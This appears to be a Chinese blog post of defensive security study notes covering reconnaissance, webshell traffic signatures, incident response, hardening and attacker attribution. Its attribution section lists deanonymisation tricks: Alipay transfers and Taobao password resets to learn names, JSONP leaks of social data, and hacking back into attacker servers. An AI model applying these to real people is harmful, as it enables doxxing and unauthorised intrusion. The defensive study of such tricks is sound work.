<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 使用nslookup进行查询，查看返回域名解析情况</span><br><span class="line">2. 超级ping</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如何绕过CDN获取真实IP</p>
</blockquote>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 目标邮件系统</span><br><span class="line">2. 扫描敏感文件：phpinfo</span><br><span class="line">3. 国外访问：偏远国家访问可能没有部署CDN</span><br><span class="line">4. 分站域名：分站可能没有部署CDN</span><br></pre></td></tr></table></figure>

<h4 id="判断目标主机系统"><a href="#判断目标主机系统" class="headerlink" title="判断目标主机系统"></a>判断目标主机系统</h4><blockquote>
<p>如何判断目标主机是Windows还是Linux</p>
</blockquote>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 大小写检测，Windows对大小写不敏感</span><br><span class="line">2. ping检测，Windows的TTL一般大于100、Linux一般小于100</span><br></pre></td></tr></table></figure>

<h4 id="无法连接3389服务器的情况"><a href="#无法连接3389服务器的情况" class="headerlink" title="无法连接3389服务器的情况"></a>无法连接3389服务器的情况</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 3389处于关闭状态</span><br><span class="line">2. 端口被修改</span><br><span class="line">3. 防火墙/杀软拦截</span><br><span class="line">4. 处于内网环境</span><br><span class="line">5. 设置了指定用户才能访问</span><br><span class="line">6. 设置了IP白名单</span><br></pre></td></tr></table></figure>

<h4 id="MySQL无法访问的原因"><a href="#MySQL无法访问的原因" class="headerlink" title="MySQL无法访问的原因"></a>MySQL无法访问的原因</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 站库分离</span><br><span class="line">2. 3306未对外开放</span><br><span class="line">3. 修改了默认端口</span><br></pre></td></tr></table></figure>

<h4 id="正向shell和反向shell的区别"><a href="#正向shell和反向shell的区别" class="headerlink" title="正向shell和反向shell的区别"></a>正向shell和反向shell的区别</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 正向shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于外网的情况</span><br><span class="line">2. 反向shell：让被攻击者连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况</span><br></pre></td></tr></table></figure>

<h4 id="正向代理和反向代理的区别"><a href="#正向代理和反向代理的区别" class="headerlink" title="正向代理和反向代理的区别"></a>正向代理和反向代理的区别</h4><blockquote>
<p>介绍</p>
</blockquote>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 反向代理：是指代理服务器来接受网络上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给网络上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器</span><br><span class="line">2. 正向代理：是一个位于客户端和目标服务器之间的服务器（代理服务器），为了从目标服务器上获取内容，客户端向代理服务器发送一个请求并指定目标，然后代理服务器向目标服务器转交请求并将获得内容返回客户端。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>区别</p>
</blockquote>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 正向代理是客户端的代理，反向代理是服务器的代理。</span><br><span class="line">2. 正向代理一般是客户端架设的，反向代理一般由服务器架设的</span><br><span class="line">3. 正向代理中服务器不知道真正的客户端到底是谁，反向代理中客户端不知道真正的服务器是谁</span><br><span class="line">4. 正向代理主要用来解决访问限制问题，反向代理则是提供负载均衡、安全防护等作用。</span><br></pre></td></tr></table></figure>

<h2 id="流量分析篇"><a href="#流量分析篇" class="headerlink" title="流量分析篇"></a>流量分析篇</h2><h4 id="目录扫描的流量分析"><a href="#目录扫描的流量分析" class="headerlink" title="目录扫描的流量分析"></a>目录扫描的流量分析</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 频繁访问同一网站或者服务器：通过穷举的方式来获取隐藏的目录或文件</span><br><span class="line">2. IP地址的多样性：可能会使用代理IP</span><br><span class="line">3. 文件或目录名的特征：例如常见的admin、backup、log等</span><br><span class="line">4. 具有规律性的扫描：例如按照字母顺序、数字顺序进行规律性扫描</span><br><span class="line">5. 大量404错误请求</span><br></pre></td></tr></table></figure>

<h4 id="爆破的流量分析"><a href="#爆破的流量分析" class="headerlink" title="爆破的流量分析"></a>爆破的流量分析</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 大量失败登录尝试</span><br><span class="line">2. 存在暴力破解的特征</span><br><span class="line">3. 异常的登录时间或频率</span><br><span class="line">4. 大量的登录尝试次数</span><br><span class="line"></span><br><span class="line">判断是否成功：</span><br><span class="line">1. 判断状态码，登录成功与否可能状态码不同</span><br><span class="line">2. 判断回显长度，回显长度可能不同</span><br><span class="line">3. 查看具体的响应包</span><br></pre></td></tr></table></figure>

<h4 id="XSS流量分析"><a href="#XSS流量分析" class="headerlink" title="XSS流量分析"></a>XSS流量分析</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 包含了恶意代码和脚本</span><br><span class="line">2. 异常的请求来源或UA</span><br><span class="line">3. 包含可疑的字符或语法</span><br><span class="line">4. 存在大量的请求</span><br><span class="line">5. 频繁的请求或异常的请求频次</span><br></pre></td></tr></table></figure>

<h4 id="命令执行的流量分析"><a href="#命令执行的流量分析" class="headerlink" title="命令执行的流量分析"></a>命令执行的流量分析</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 命令的特征：查看payload可以进行判断</span><br><span class="line">2. 命令的来源</span><br><span class="line">3. 命令执行的结果：命令执行后，目标系统可能会有响应返回结果，可能包含了相关目标系统的敏感信息</span><br><span class="line">4. 修改文件的行为：命令执行可能导致目标系统上的文件进行修改、删除等操作</span><br></pre></td></tr></table></figure>

<h4 id="SQL注入的流量分析"><a href="#SQL注入的流量分析" class="headerlink" title="SQL注入的流量分析"></a>SQL注入的流量分析</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 在http请求中存在大量的SQL注入语句</span><br><span class="line">2. 在分析流量的时候，可以使用http contains &quot;关键字&quot;来进行过滤流量</span><br><span class="line">3. 可以通过注入的流量判断是否攻击成功，并且可以判断注入点和注入类型</span><br></pre></td></tr></table></figure>

<h4 id="文件包含的流量分析"><a href="#文件包含的流量分析" class="headerlink" title="文件包含的流量分析"></a>文件包含的流量分析</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 通常含有webshell的常见特性：代码执行函数或者命令执行函数</span><br><span class="line">2. 常以可执行文件的格式进行上传</span><br></pre></td></tr></table></figure>

<h3 id="常见webshell管理工具的流量特征"><a href="#常见webshell管理工具的流量特征" class="headerlink" title="常见webshell管理工具的流量特征"></a>常见webshell管理工具的流量特征</h3><h4 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 默认的蚁剑会有两次请求</span><br><span class="line">2. 其请求的主体会经过URL编码</span><br><span class="line">3. 存在ini_set(&quot;display_errors&quot;,&quot;0&quot;)字符特征码</span><br><span class="line">-------------------------------------------------</span><br><span class="line">默认的user-agent请求头是antsword xxx，不过可以修改。</span><br><span class="line">一般将payload进行分段，然后分别进行base64编码，一般具有像eval这样的关键字，然后呢大概率还有@ini_set(&quot;display&quot;,&quot;0&quot;);这段代码。</span><br></pre></td></tr></table></figure>

<h4 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 请求体中存在eval，base64等特殊字符</span><br><span class="line">2. 菜刀的UA头为百度的UA</span><br><span class="line">3. 请求体中的payload为base64编码</span><br><span class="line">4. 请求体中执行结果为明文，格式为X@Y 结果 X@Y</span><br><span class="line">-------------------------------------------</span><br><span class="line">连接过程中使用base64编码对发送的指令进行加密，其中两个关键payload z1 和 z2，名字都是可变的。</span><br><span class="line">然后还有一段以QG开头，7J结尾的固定代码。</span><br></pre></td></tr></table></figure>

<h4 id="冰蝎2-0"><a href="#冰蝎2-0" class="headerlink" title="冰蝎2.0"></a>冰蝎2.0</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 使用aes加密发起三次请求</span><br><span class="line">2. 第一次请求服务端产生密钥写入session，session和当前会话绑定，（不同的客户端的密钥也是不同的）</span><br><span class="line">3. 第二次请求是为了获取key</span><br><span class="line">4. 第三次进行通信</span><br></pre></td></tr></table></figure>

<h4 id="哥斯拉4-0"><a href="#哥斯拉4-0" class="headerlink" title="哥斯拉4.0"></a>哥斯拉4.0</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 在经过base64解码之前，要进行一次反转</span><br><span class="line">2. 在连接的过程中会有三次请求</span><br><span class="line">3. 第一次请求并没有响应内容</span><br><span class="line">4. 第二次请求和第三次请求的内容是相同的</span><br><span class="line">----------------------------------------</span><br><span class="line">1.jsp代码中可能会具有getclass，getclassLoader等关键字，payload使用base64编码等特征。php和asp则是普通的一句话木马。</span><br><span class="line">2.在响应包的cache-control字段中有no-store，no-cache等特征。</span><br><span class="line">3.所有请求中的cookie字段最后面都存在；特征。</span><br></pre></td></tr></table></figure>

<h2 id="应急响应篇"><a href="#应急响应篇" class="headerlink" title="应急响应篇"></a>应急响应篇</h2><h4 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">从上往下依次是：</span><br><span class="line">1. 应用层</span><br><span class="line">2. 表示层</span><br><span class="line">3. 会话层</span><br><span class="line">4. 传输层</span><br><span class="line">5. 网络层</span><br><span class="line">6. 数据链路层</span><br><span class="line">7. 物理层</span><br></pre></td></tr></table></figure>

<h4 id="应急响应的基本思路流程"><a href="#应急响应的基本思路流程" class="headerlink" title="应急响应的基本思路流程"></a>应急响应的基本思路流程</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 收集信息：收集客户信息和中毒主机信息，包括样本</span><br><span class="line">2. 判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等</span><br><span class="line">3. 抑制范围：隔离使受害⾯不继续扩⼤</span><br><span class="line">4. 深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源</span><br><span class="line">5. 清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产</span><br><span class="line">6. 产出报告：整理并输出完整的安全事件报告</span><br></pre></td></tr></table></figure>

<h4 id="应急响应六个阶段"><a href="#应急响应六个阶段" class="headerlink" title="应急响应六个阶段"></a>应急响应六个阶段</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">准备、检测、遏制、根除、恢复、跟踪</span><br><span class="line"></span><br><span class="line">1. 准备：包括建立紧急响应团队、制定应急预案、开展演练和培训等，以确保在事件发生时可以应对</span><br><span class="line">2. 检测：监控网络、系统和应用程序，及时发现异常行为、攻击和漏洞等问题，以便迅速做出反应</span><br><span class="line">3. 遏制：采取措施限制安全事件的影响、停止攻击行为，并对受影响的系统或数据进行隔离和保护</span><br><span class="line">4. 根除：通过对受感染、被操纵或遭遇攻击的系统、设备和数据进行检查、清理和恢复等措施，从而彻底根除恶意软件和对网络的攻击</span><br><span class="line">5. 恢复：对被影响的设备或系统进行修复和加固，并恢复业务、应用程序和服务，以便尽快返回正常运行状态</span><br><span class="line">6. 跟踪：跟踪事故发生的原因和过程，分析并总结，总结经验教训，改进应急响应流程和方案，以提高应对未来安全事件的能力</span><br></pre></td></tr></table></figure>

<h4 id="应急响应常见事件分类"><a href="#应急响应常见事件分类" class="headerlink" title="应急响应常见事件分类"></a>应急响应常见事件分类</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. web入侵：网页挂马、主页篡改、webshell</span><br><span class="line">2. 系统入侵：病毒木马、勒索软件、远控后门</span><br><span class="line">3. 网络攻击：DNS劫持、DDOS攻击、ARP欺骗</span><br></pre></td></tr></table></figure>

<h3 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h3><h4 id="Windows入侵检测"><a href="#Windows入侵检测" class="headerlink" title="Windows入侵检测"></a>Windows入侵检测</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. 检查系统账号安全：</span><br><span class="line">	（1）查看是否有弱口令；</span><br><span class="line">	（2）远程管理端口是否开放；</span><br><span class="line">	（3）用D盾查看服务器是否有隐藏账号、克隆账号</span><br><span class="line">2. 检查异常端口、进程：</span><br><span class="line">	（1）使用netstat -ano进行查看端口连接情况；</span><br><span class="line">	（2）任务管理器查看进程</span><br><span class="line">3. 检查服务自启动(services.msc)、计划任务(at、schtasks.exe)</span><br><span class="line">4. 检查系统相关信息：</span><br><span class="line">	（1）查看系统版本（systeminfo）以及补丁信息（hotfix）；</span><br><span class="line">	（2）查看可疑目录及文件</span><br><span class="line">5. 日志分析（eventvwr.msc）</span><br></pre></td></tr></table></figure>

<h4 id="Linux入侵检测"><a href="#Linux入侵检测" class="headerlink" title="Linux入侵检测"></a>Linux入侵检测</h4><ol>
<li>账号安全：<ol>
<li><code>who</code>（pts是远程登录，tty是本地登录）</li>
<li><code>uptime</code>：查看登录多久、多少用户</li>
<li>查看<code>/etc/passwd</code>，删除无密码用户</li>
<li><code>/etc/shadow</code>：设置密码有效期</li>
</ol>
</li>
<li>历史命令：<ol>
<li>通过history查看历史命令</li>
<li>在历史命令尾部加上具体时间【在&#x2F;etc&#x2F;profile文件的末尾加上 export HISTTIMEFORMAT&#x3D;”%Y-%m-%d %H:%M:%S “ ，然后 source &#x2F;etc&#x2F;profile 生效】</li>
</ol>
</li>
<li>检查异常端口：</li>
<li>netstat -antlp|more（more会按也显示文本）</li>
<li>查看pid所对应的进程文件路径（ls -l &#x2F;proc&#x2F;$PID&#x2F;exe:$PID表示所对应的PID号）</li>
<li>检查异常进程：<code>ps aux | more</code></li>
<li>检查开机自启项：<ol>
<li><code>/etc/rc.local</code></li>
<li><code>/etc/rc.d/rc[0~6].d</code></li>
</ol>
</li>
<li>检查定时任务：<ol>
<li><code>crontab -l</code>：列出某个用户cron服务的详细内容</li>
<li><code>crontab -r</code>：删除指定用户的定时任务（需要谨慎操作）</li>
<li><code>crontab -e</code>：编辑当前的定时任务</li>
</ol>
</li>
<li>检查服务：<code>chkconfig --list</code>：查看系统运行的服务</li>
<li>检查异常文件</li>
<li>检查系统日志</li>
</ol>
<h3 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h3><h4 id="Linux常用排查命令"><a href="#Linux常用排查命令" class="headerlink" title="Linux常用排查命令"></a>Linux常用排查命令</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">系统信息：</span><br><span class="line">    1. 查看当前系统状态：top</span><br><span class="line">    2. 操作系统信息：uname -a</span><br><span class="line">    3. 查看当前系统进程信息：ps</span><br><span class="line">    4. 查看历史命令：history</span><br><span class="line">    5. 列出所有的连接和监听的端口：netstat</span><br><span class="line">    6. 查看谁在使用某个端口：lsof</span><br><span class="line">用户登录：</span><br><span class="line">    1. 查看当前用户登录系统的情况：who</span><br><span class="line">    2. 分析超级权限账户：awk -F: &#x27;&#123;if ($3==0) print $1&#125;&#x27; /etc/passwd</span><br><span class="line">    3. 查看可登录的账户：cat /etc/passwd | grep &quot;/bin/bash&quot;</span><br><span class="line">    4. 查看用户错误的登录信息：lastb</span><br><span class="line">    5. 查看空口令账户：awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="基线检查"><a href="#基线检查" class="headerlink" title="基线检查"></a>基线检查</h3><h4 id="Linux基线检查"><a href="#Linux基线检查" class="headerlink" title="Linux基线检查"></a>Linux基线检查</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">账号管理和授权：</span><br><span class="line">    1. 检查特殊账号，是否存在空密码的账户和root权限账户</span><br><span class="line">    2. 禁用或删除无用账号</span><br><span class="line">    3. 添加口令策略：设置过期时间、连续认证失败次数</span><br><span class="line">    4. 禁止root远程登录</span><br><span class="line">服务：</span><br><span class="line">    1. 关闭不必要的服务</span><br><span class="line">    2. SSH服务安全：</span><br><span class="line">        2.1. 不允许root直接登录：permitrootlogin=no</span><br><span class="line">        2.2. 修改ssh的版本为2</span><br><span class="line">        2.3. 修改允许错误密码次数：MaxAuthTries=3</span><br><span class="line">文件系统：</span><br><span class="line">    1. 设置umask值：在/etc/profile添加行umask 027</span><br><span class="line">    2. 设置登录超时：在/etc/profile将TMOUT=开头的注释去掉，并且设置会TMOUT=180（180秒）</span><br></pre></td></tr></table></figure>

<h4 id="Windows安全基线"><a href="#Windows安全基线" class="headerlink" title="Windows安全基线"></a>Windows安全基线</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">身份鉴别、访问控制、安全审计、资源控制、剩余信息保护</span><br><span class="line">身份鉴别：</span><br><span class="line">    1. 更改缺省账户</span><br><span class="line">    2. 检查游客账户是否禁用</span><br><span class="line">    3. 密码复杂性要求</span><br><span class="line">    4. 密码长度不能小于8位</span><br><span class="line">访问控制：</span><br><span class="line">    1. 共享账户检查</span><br><span class="line">    2. 远程关机授权</span><br><span class="line">    3. 授权账户登录</span><br><span class="line">安全审计：</span><br><span class="line">    1. 用户登录日志记录</span><br><span class="line">    2. 系统日志完备性检查</span><br><span class="line">    3. 登录超时管理</span><br><span class="line">资源控制：</span><br><span class="line">    1. 登录超时管理</span><br><span class="line">    2. 远程登录超时配置</span><br><span class="line">剩余信息保护：</span><br><span class="line">    1. 不显示上次的用户名</span><br><span class="line">    2. 关机前清除虚拟内存页面</span><br><span class="line">    3. 不启用可还原的加密来存储密码</span><br></pre></td></tr></table></figure>

<h3 id="系统加固"><a href="#系统加固" class="headerlink" title="系统加固"></a>系统加固</h3><h4 id="账户安全"><a href="#账户安全" class="headerlink" title="账户安全"></a>账户安全</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">windows：</span><br><span class="line">	1. 不显示上次登录的用户名，防止弱口令爆破；</span><br><span class="line">	2. 设置账户锁定策略，比如设置登录限制次数，达到多少次锁定多长时间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">linux：</span><br><span class="line">	1. 禁用root之外的超级用户：</span><br><span class="line">		1.1. 禁用：使用sudo passwd -l &lt;用户名&gt;</span><br><span class="line">		1.2. 启用：使用sudo passwd -u &lt;用户名&gt;</span><br><span class="line">	2. 限制普通用户使用sudo提权，或者限制使用sudo提权的权限大小</span><br><span class="line">	3. 锁定系统中不使用的账号</span><br><span class="line">	4. 设置登录失败锁定次数、锁定时间</span><br></pre></td></tr></table></figure>

<h4 id="口令安全"><a href="#口令安全" class="headerlink" title="口令安全"></a>口令安全</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">windows：</span><br><span class="line">	1. 设置密码复杂性要求</span><br><span class="line">	2. 设置最小密码长度</span><br><span class="line">	3. 设置不能使用历史密码</span><br><span class="line"></span><br><span class="line">Linux：</span><br><span class="line">	1. 检查shadow文件中是否存在空口令账户</span><br><span class="line">	2. 设置口令复杂度要求</span><br><span class="line">	3. 设置密码有效期：vim /etc/login.defs</span><br></pre></td></tr></table></figure>

<h4 id="服务与端口"><a href="#服务与端口" class="headerlink" title="服务与端口"></a>服务与端口</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 关闭或者限制常见的高危端口，例如：22、23、445、3389</span><br><span class="line">	1.1. windows：使用防火墙限制端口</span><br><span class="line">	1.2. linux：使用iptables封禁IP或者限制端口</span><br><span class="line">2. 排查计划任务：</span><br><span class="line">	2.1. windows上使用compmgmt.msc</span><br><span class="line">	2.2. Linux上查看crontab -l</span><br></pre></td></tr></table></figure>

<h4 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux上chmod修改文件权限，chattr重要文件设置不可修改权限</span><br></pre></td></tr></table></figure>

<h4 id="系统日志审计"><a href="#系统日志审计" class="headerlink" title="系统日志审计"></a>系统日志审计</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">系统日志：/var/log/message</span><br><span class="line">cron日志：/var/log/cron</span><br><span class="line">安全日志：/var/log/secure</span><br></pre></td></tr></table></figure>

<h3 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h3><h4 id="溯源的基本步骤"><a href="#溯源的基本步骤" class="headerlink" title="溯源的基本步骤"></a>溯源的基本步骤</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1.攻击源捕获</span><br><span class="line">    安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等</span><br><span class="line">    日志与流量分析，异常的通讯流量、攻击源与攻击目标等</span><br><span class="line">    服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</span><br><span class="line">    邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等</span><br><span class="line">    蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</span><br><span class="line">2.溯源反制手段</span><br><span class="line">    IP 定位技术</span><br><span class="line">    根据IP定位物理地址–代理 IP</span><br><span class="line">    溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</span><br><span class="line">    ID 追踪术</span><br><span class="line">    ID 追踪术，搜索引擎、社交平台、技术论坛、社工库匹配</span><br><span class="line">    溯源案例：利用 ID 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</span><br><span class="line">    网站 url</span><br><span class="line">    域名 Whois 查询–注册人姓名、地址、电话和邮箱 --域名隐私保护</span><br><span class="line">    溯源案例：通过攻击 IP 历史解析记录/域名，对域名注册信息进行溯源分析</span><br><span class="line">    恶意样本分析</span><br><span class="line">    提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析</span><br><span class="line">    溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者</span><br><span class="line">    社交账号</span><br><span class="line">    基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等</span><br><span class="line">    利用条件：可以找到相关社交网站的 jsonp 接口泄露敏感信息，相关网站登录未注销</span><br><span class="line">3.攻击者画像</span><br><span class="line">    攻击路径</span><br><span class="line">    攻击目的：拿到权限、窃取数据、获取利益、DDOS 等</span><br><span class="line">    网络代理：代理 IP、跳板机、C2 服务器等</span><br><span class="line">    攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</span><br><span class="line"></span><br><span class="line">    攻击者身份画像</span><br><span class="line">    虚拟身份：ID、昵称、网名</span><br><span class="line">    真实身份：姓名、物理位置</span><br><span class="line">    联系方式：手机号、qq/微信、邮箱</span><br><span class="line">    组织情况：单位名称、职位信息</span><br></pre></td></tr></table></figure>

<h4 id="溯源的技巧"><a href="#溯源的技巧" class="headerlink" title="溯源的技巧"></a>溯源的技巧</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">域名、ip 反查目标个人信息</span><br><span class="line">支付宝转账，确定目标姓氏</span><br><span class="line">淘宝找回密码，确定目标名字</span><br><span class="line">企业微信手机号查公司名称</span><br><span class="line">REG007 查注册应用、网站</span><br><span class="line">程序 PDB 信息泄露</span><br></pre></td></tr></table></figure>

